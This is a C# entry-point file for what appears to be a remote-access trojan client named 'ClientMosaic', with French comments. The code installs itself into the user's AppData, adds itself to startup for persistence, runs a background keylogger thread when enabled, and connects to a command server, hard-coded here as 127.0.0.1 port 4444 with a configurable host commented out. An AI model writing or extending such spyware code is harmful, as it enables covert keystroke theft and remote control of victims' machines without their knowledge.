using Client.Controllers;
using Client.Controllers.Tools;
using Client.Models;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Client
{
    static class Program
    {
        public static ClientMosaic client;
        public static Boot bootController;
        private static ApplicationContext _msgLoop; // keylogger

        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            bool result;

            bootController = new Boot();

            StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);// TODO virer
            MutexController.mutexKey = Boot.getMutexKey(readerMutex);// TODO virer
            result = MutexController.createMutex();// TODO virer

            ClientData.installPath = Path.Combine(AuthenticationController.DIRECTORY, ((!string.IsNullOrEmpty(AuthenticationController.SUBDIRECTORY)) ? AuthenticationController.SUBDIRECTORY + @"\" : "") + AuthenticationController.INSTALLNAME); //  	Directory ~~== %USERPROFILE%\Application Data(\Roaming)

            if (!result)
            {
                MessageBox.Show("Another instance of application is already running !");
                return;
            }

            if (bootController.autoStart)
            {
                if (!Boot.AddToStartup())
                        ClientData.AddToStartupFailed = true;
            }

            if (bootController.klEnabled)
            {
                new Thread(() =>
                {
                    _msgLoop = new ApplicationContext();
                    Keylogger logger = new Keylogger(15000);
                    Application.Run(_msgLoop);
                }){ IsBackground = true }.Start();
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            client = new ClientMosaic("127.0.0.1", 4444);
            //client = new ClientMosaic(bootController.host, bootController.port);
            client.connect();
        }
    }
}
